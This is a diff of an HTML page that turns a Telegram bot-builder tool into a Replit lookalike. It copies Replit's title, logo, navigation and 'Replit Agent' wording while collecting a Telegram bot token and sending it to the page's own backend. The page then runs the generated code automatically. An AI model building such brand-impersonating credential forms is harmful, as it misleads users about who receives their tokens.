@@ -3,109 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Akmal AI Studio — Next-Gen Bot Builder</title>
+    <title>Replit – Build apps and sites with AI</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-dark: #08090c;
-            --panel-bg: #12151e;
-            --border-color: #23283b;
-            --accent-blue: #0070f3;
-            --accent-purple: #7928ca;
-            --accent-green: #50e3c2;
-            --text-main: #f3f4f6;
+            --bg-cream: #FBF9F5;
+            --text-dark: #1C1917;
+            --text-muted: #78716C;
+            --border-orange: #FF6B4A;
+            --border-light: #E7E5E4;
+            --btn-orange: #FF5733;
+            --card-bg: #F5F3EF;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', system-ui, -apple-system, sans-serif; }
-        body { background: var(--bg-dark); color: var(--text-main); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-cream); color: var(--text-dark); min-height: 100vh; display: flex; flex-direction: column; }
 
-        header { background: var(--panel-bg); border-bottom: 1px solid var(--border-color); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; }
-        .logo { font-size: 1.2rem; font-weight: 800; background: linear-gradient(90deg, #0070f3, #7928ca); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: flex; align-items: center; gap: 10px; }
-        .badge { background: rgba(80, 227, 194, 0.1); color: var(--accent-green); border: 1px solid var(--accent-green); padding: 2px 8px; border-radius: 20px; font-size: 0.7rem; font-weight: 600; }
-
-        .main-layout { display: flex; flex: 1; height: calc(100vh - 61px); }
-
-        /* Left AI Prompt Section */
-        .ai-sidebar { width: 320px; background: var(--panel-bg); border-right: 1px solid var(--border-color); padding: 20px; display: flex; flex-direction: column; gap: 15px; }
-        .ai-sidebar h3 { font-size: 0.9rem; text-transform: uppercase; color: #888; letter-spacing: 1px; }
-        .input-group { display: flex; flex-direction: column; gap: 6px; }
-        .input-group label { font-size: 0.8rem; color: #aaa; }
-        .input-group input, .input-group textarea { background: #08090c; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; color: white; font-size: 0.85rem; outline: none; }
-        .input-group input:focus, .input-group textarea:focus { border-color: var(--accent-blue); }
-
-        .btn-generate { background: linear-gradient(90deg, var(--accent-blue), var(--accent-purple)); color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .btn-generate:hover { opacity: 0.9; transform: translateY(-1px); }
-
-        /* Center Editor Section */
-        .editor-section { flex: 1; display: flex; flex-direction: column; border-right: 1px solid var(--border-color); }
-        .editor-header { background: #0c0e14; padding: 10px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
-        .file-tab { background: var(--panel-bg); color: var(--accent-blue); padding: 6px 14px; border-radius: 6px; font-size: 0.85rem; border: 1px solid var(--border-color); font-weight: 600; }
-        .code-area { flex: 1; background: #08090c; color: #e1e4e8; border: none; padding: 20px; font-family: 'Fira Code', monospace; font-size: 14px; line-height: 1.6; outline: none; resize: none; }
-
-        /* Right Terminal Section */
-        .terminal-section { width: 380px; background: #050608; display: flex; flex-direction: column; }
-        .terminal-header { background: var(--panel-bg); padding: 10px 15px; border-bottom: 1px solid var(--border-color); font-size: 0.8rem; color: #888; display: flex; justify-content: space-between; }
-        .terminal-logs { flex: 1; padding: 15px; font-family: monospace; font-size: 0.85rem; color: var(--accent-green); overflow-y: auto; white-space: pre-wrap; }
+        /* Navigation Bar */
+        header { display: flex; justify-content: space-between; align-items: center; padding: 18px 40px; background: transparent; }
+        .logo-container { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 1.4rem; color: var(--text-dark); cursor: pointer; }
+        .logo-icon { width: 24px; height: 24px; background-color: var(--btn-orange); border-radius: 4px; display: inline-block; }
         
-        .btn-run { background: #10b981; color: white; border: none; padding: 6px 16px; border-radius: 6px; font-weight: 600; cursor: pointer; }
-        .btn-run:hover { background: #059669; }
+        nav { display: flex; gap: 24px; align-items: center; }
+        nav a { text-decoration: none; color: var(--text-dark); font-size: 0.95rem; font-weight: 500; display: flex; align-items: center; gap: 4px; }
+        nav a:hover { color: var(--text-muted); }
+
+        .auth-buttons { display: flex; gap: 16px; align-items: center; }
+        .btn-log { text-decoration: none; color: var(--text-dark); font-weight: 500; font-size: 0.95rem; }
+        .btn-create { border: 1px solid var(--btn-orange); color: var(--btn-orange); padding: 8px 18px; border-radius: 20px; font-weight: 500; text-decoration: none; font-size: 0.95rem; transition: 0.2s; }
+        .btn-create:hover { background: rgba(255, 87, 51, 0.05); }
+
+        /* Hero Section */
+        .hero { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px 20px; max-width: 900px; margin: 0 auto; width: 100%; }
+        .hero h1 { font-size: 4rem; font-weight: 700; letter-spacing: -1.5px; margin-bottom: 12px; }
+        .hero p { color: var(--text-muted); font-size: 1.15rem; margin-bottom: 36px; }
+
+        /* Main AI Prompt Box */
+        .prompt-card { background: #FFFFFF; border: 1.5px solid #FF8C73; border-radius: 16px; padding: 16px; width: 100%; max-width: 680px; box-shadow: 0 10px 30px rgba(0,0,0,0.03); display: flex; flex-direction: column; gap: 12px; position: relative; }
+        .prompt-input-group { display: flex; flex-direction: column; gap: 8px; text-align: left; }
+        .token-input { border: 1px solid var(--border-light); border-radius: 8px; padding: 10px 14px; font-size: 0.85rem; outline: none; background: #FAF9F6; width: 100%; }
+        .token-input:focus { border-color: var(--btn-orange); }
+
+        .prompt-textarea { border: none; outline: none; width: 100%; resize: none; font-size: 1.05rem; color: var(--text-dark); background: transparent; min-height: 70px; }
+        .prompt-textarea::placeholder { color: #A8A29E; }
+
+        .prompt-bottom { display: flex; justify-content: space-between; align-items: center; }
+        .add-btn { background: transparent; border: none; font-size: 1.4rem; color: var(--text-muted); cursor: pointer; padding: 0 4px; }
+        
+        .submit-btn { background: var(--btn-orange); border: none; width: 36px; height: 36px; border-radius: 50%; color: white; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.2s; }
+        .submit-btn:hover { opacity: 0.9; transform: scale(1.05); }
+        .submit-btn svg { width: 18px; height: 18px; fill: currentColor; }
+
+        /* Categories Slider */
+        .categories { display: flex; gap: 12px; margin-top: 32px; justify-content: center; align-items: center; flex-wrap: wrap; }
+        .cat-item { background: #FAF8F5; border: 1px solid var(--border-light); border-radius: 12px; padding: 14px 20px; display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; transition: 0.2s; width: 90px; }
+        .cat-item:hover { background: #F0EDE6; }
+        .cat-item svg { width: 20px; height: 20px; fill: var(--text-dark); }
+        .cat-item span { font-size: 0.75rem; font-weight: 500; color: var(--text-dark); }
+
+        /* Prompt Suggestions */
+        .suggestions-title { font-size: 0.85rem; color: var(--text-muted); margin-top: 28px; margin-bottom: 12px; }
+        .suggestions { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+        .sugg-chip { background: var(--card-bg); border: 1px solid var(--border-light); border-radius: 8px; padding: 8px 14px; font-size: 0.85rem; color: var(--text-dark); cursor: pointer; transition: 0.2s; }
+        .sugg-chip:hover { background: #EBE8E0; }
+
+        /* Output Modal / Workspace Section */
+        .workspace { margin-top: 40px; width: 100%; max-width: 900px; display: none; text-align: left; background: #FFFFFF; border: 1px solid var(--border-light); border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        .ws-header { background: #F5F3EF; padding: 12px 20px; border-bottom: 1px solid var(--border-light); display: flex; justify-content: space-between; align-items: center; }
+        .ws-title { font-weight: 600; font-size: 0.9rem; }
+        .ws-body { display: flex; height: 400px; }
+        .code-area { flex: 1; padding: 16px; font-family: monospace; font-size: 0.85rem; background: #1C1917; color: #F5F5F4; border: none; outline: none; resize: none; }
+        .terminal-area { width: 320px; background: #0C0A09; color: #22C55E; padding: 16px; font-family: monospace; font-size: 0.8rem; overflow-y: auto; white-space: pre-wrap; border-left: 1px solid #27272A; }
     </style>
 </head>
 <body>
 
+    <!-- Header Navigation -->
     <header>
-        <div class="logo">⚡️ AKMAL AI STUDIO <span class="badge">7X CHEAP & 2X FASTER</span></div>
-        <button class="btn-run" onclick="runCode()">▶️ Botni Ishga Tushirish</button>
+        <div class="logo-container">
+            <span class="logo-icon"></span>
+            Replit
+        </div>
+        <nav>
+            <a href="#">Products ▾</a>
+            <a href="#">For Work ▾</a>
+            <a href="#">Resources ▾</a>
+            <a href="#">Security</a>
+            <a href="#">Pricing</a>
+            <a href="#">Enterprise</a>
+        </nav>
+        <div class="auth-buttons">
+            <a href="#" class="btn-log">Contact sales</a>
+            <a href="#" class="btn-log">Log in</a>
+            <a href="#" class="btn-create">Create account</a>
+        </div>
     </header>
 
-    <div class="main-layout">
-        <!-- AI Bot Creator Sidebar -->
-        <div class="ai-sidebar">
-            <h3>🤖 AI Bot Yaratuvchi</h3>
-            <div class="input-group">
-                <label>Telegram Bot Token:</label>
-                <input type="text" id="bot-token" placeholder="123456789:AAH...">
+    <!-- Hero Content -->
+    <div class="hero">
+        <h1>What will you build?</h1>
+        <p>Turn ideas into apps in minutes — no coding needed</p>
+
+        <!-- Prompt Card -->
+        <div class="prompt-card">
+            <input type="text" id="bot-token" class="token-input" placeholder="Telegram Bot Token (masalan: 123456:ABC...)" />
+            <textarea id="bot-prompt" class="prompt-textarea" placeholder="Create a Telegram bot that..."></textarea>
+            
+            <div class="prompt-bottom">
+                <button class="add-btn">+</button>
+                <button class="submit-btn" onclick="generateAndRun()">
+                    <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </button>
             </div>
-            <div class="input-group">
-                <label>Bot vazifasini ta'riflang:</label>
-                <textarea id="bot-prompt" rows="6" placeholder="Masalan: Menga valyuta kurslarini ko'rsatadigan bot yaratib ber..."></textarea>
-            </div>
-            <button class="btn-generate" onclick="generateBot()">✨ Botni Avtomatik Yaratish</button>
         </div>
 
-        <!-- Editor -->
-        <div class="editor-section">
-            <div class="editor-header">
-                <div class="file-tab">📄 main.py</div>
-                <span style="font-size: 0.8rem; color: #666;">Auto-Saved</span>
+        <!-- Categories -->
+        <div class="categories">
+            <div class="cat-item">
+                <svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke="currentColor" stroke-width="2"/></svg>
+                <span>Website</span>
             </div>
-            <textarea id="editor" class="code-area" spellcheck="false"># Bu yerda AI yaratgan bot kodi paydo bo'ladi...
-# Chap tomondagi paneldan bot vazifasini yozing va tugmani bosing!</textarea>
+            <div class="cat-item">
+                <svg viewBox="0 0 24 24"><rect x="7" y="2" width="10" height="20" rx="2" stroke="currentColor" stroke-width="2" fill="none"/></svg>
+                <span>Mobile</span>
+            </div>
+            <div class="cat-item">
+                <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2" fill="none"/></svg>
+                <span>Design</span>
+            </div>
+            <div class="cat-item">
+                <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" stroke="currentColor" stroke-width="2" fill="none"/></svg>
+                <span>Slides</span>
+            </div>
+            <div class="cat-item">
+                <svg viewBox="0 0 24 24"><path d="M12 2v20M2 12h20" stroke="currentColor" stroke-width="2"/></svg>
+                <span>Animation</span>
+            </div>
         </div>
 
-        <!-- Terminal -->
-        <div class="terminal-section">
-            <div class="terminal-header">
-                <span>💻 LIVE CONSOLE LOGS</span>
-                <span id="status" style="color: #10b981;">STANDBY</span>
+        <!-- Suggestions -->
+        <div class="suggestions-title">Try an example prompt 🔄</div>
+        <div class="suggestions">
+            <div class="sugg-chip" onclick="setPrompt('Open budget statistika va ariza beruvchi Telegram bot yaratib ber')">Cohort analysis dashboard</div>
+            <div class="sugg-chip" onclick="setPrompt('Savdo va sotuvlarni hisoblab boruvchi biznes bot yaratib ber')">Retail sales dashboard</div>
+            <div class="sugg-chip" onclick="setPrompt('Kunlik vazifalar va salomatlik kunligini yurituvchi bot yarat')">Wellness journal</div>
+        </div>
+
+        <!-- Hidden Workspace (Appears after generate) -->
+        <div id="workspace" class="workspace">
+            <div class="ws-header">
+                <span class="ws-title">⚡️ Replit Agent — Code Output</span>
+                <span id="status-badge" style="color: #22C55E; font-size: 0.8rem; font-weight: 600;">READY</span>
             </div>
-            <div id="terminal" class="terminal-logs">Tizim tayyor. Bot yaratish uchun so'rov yuboring...</div>
+            <div class="ws-body">
+                <textarea id="editor" class="code-area" spellcheck="false" readonly></textarea>
+                <div id="terminal" class="terminal-area">Live logs appear here...</div>
+            </div>
         </div>
     </div>
 
     <script>
-        async function generateBot() {
+        function setPrompt(text) {
+            document.getElementById('bot-prompt').value = text;
+        }
+
+        async function generateAndRun() {
             const prompt = document.getElementById('bot-prompt').value;
             const token = document.getElementById('bot-token').value;
+            const workspace = document.getElementById('workspace');
             const editor = document.getElementById('editor');
             const terminal = document.getElementById('terminal');
+            const statusBadge = document.getElementById('status-badge');
 
             if(!prompt || !token) {
-                alert("Iltimos, Bot Token va Bot vazifasini kiriting!");
+                alert("Iltimos, Bot Token va vazifani kiriting!");
                 return;
             }
 
-            terminal.innerText = "⏳ AI Bot kodi generatsiya qilinmoqda...\nFayllar va struktura tuzilmoqda...";
-            
+            workspace.style.display = 'block';
+            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+
+            terminal.innerText = "⏳ Replit AI bot kodingizni generatsiya qilmoqda...\n";
+            statusBadge.innerText = "GENERATING...";
+            statusBadge.style.color = "#EAB308";
+
             try {
                 const response = await fetch('/generate-bot', {
                     method: 'POST',
@@ -116,23 +197,23 @@
 
                 if(data.error) {
                     terminal.innerText = "❌ Xatolik: " + data.error;
+                    statusBadge.innerText = "ERROR";
+                    statusBadge.style.color = "#EF4444";
                 } else {
                     editor.value = data.code;
-                    terminal.innerText = "✅ Bot kodi muvaffaqiyatli yaratildi!\n'▶️ Botni Ishga Tushirish' tugmasini bosing.";
+                    terminal.innerText = "✅ Bot kodi muvaffaqiyatli yaratildi!\n🚀 Bot orqa fonda ishga tushirilmoqda...\n";
+                    
+                    // Avtomatik orqa fonda yurgazish
+                    runCode(data.code);
                 }
             } catch(err) {
                 terminal.innerText = "❌ Server bilan bog'lanishda xatolik yuz berdi.";
             }
         }
 
-        async function runCode() {
-            const code = document.getElementById('editor').value;
+        async function runCode(code) {
             const terminal = document.getElementById('terminal');
-            const status = document.getElementById('status');
-
-            terminal.innerText = "🚀 Bot serverda ishga tushirilmoqda...";
-            status.innerText = "RUNNING";
-            status.style.color = "#f59e0b";
+            const statusBadge = document.getElementById('status-badge');
 
             try {
                 const response = await fetch('/run-python', {
@@ -143,16 +224,16 @@
                 const data = await response.json();
 
                 if(data.error) {
-                    terminal.innerText = "❌ Xatolik:\n" + data.error;
-                    status.innerText = "ERROR";
-                    status.style.color = "#ef4444";
+                    terminal.innerText += "❌ Xatolik:\n" + data.error;
+                    statusBadge.innerText = "ERROR";
+                    statusBadge.style.color = "#EF4444";
                 } else {
-                    terminal.innerText = "✅ OUTPUT:\n" + (data.output || "Bot fonda to'xtovsiz ishlamoqda...");
-                    status.innerText = "ONLINE";
-                    status.style.color = "#10b981";
+                    terminal.innerText += "✅ " + data.output + "\n🤖 Bot Telegram'da aktiv!";
+                    statusBadge.innerText = "RUNNING 24/7";
+                    statusBadge.style.color = "#22C55E";
                 }
             } catch(err) {
-                terminal.innerText = "❌ Aloqa uzildi!";
+                terminal.innerText += "\n❌ Aloqa uzildi!";
             }
         }
     </script>
